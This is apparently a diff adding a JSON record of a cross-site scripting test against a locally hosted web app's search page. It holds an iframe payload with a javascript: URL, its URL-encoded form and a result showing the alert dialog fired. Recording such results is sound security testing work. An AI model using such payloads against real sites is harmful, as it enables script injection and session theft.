@@ -1,0 +1,6 @@
+{
+  "url": "http://127.0.0.1:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E",
+  "payload": "<iframe src=\"javascript:alert(`xss`)\">",
+  "dialogFired": true,
+  "dialogMessage": "xss"
+}
